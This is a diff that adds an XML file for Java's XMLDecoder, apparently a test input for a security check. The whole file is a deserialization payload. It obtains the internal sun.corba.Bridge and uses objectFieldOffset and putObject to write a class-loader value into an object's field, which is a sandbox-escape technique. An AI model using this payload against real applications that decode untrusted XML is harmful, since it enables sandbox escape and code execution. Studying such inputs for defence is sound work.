@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<java version="1.6.0" class="java.beans.XMLDecoder">
+  <object id="hold" class="x.H">
+     <void property="content">
+        <object id="bridge" class="sun.corba.Bridge" method="get">
+            <void id="off"  method="objectFieldOffset">
+               <object class="x.H" method="getField" />
+            </void>  
+            <void method="putObject">
+               <object idref="hold" />
+               <object idref="off" />
+               <object class="x.H" method="getCCL" />
+            </void>  
+        </object>    
+     </void>
+  </object>
+</java>
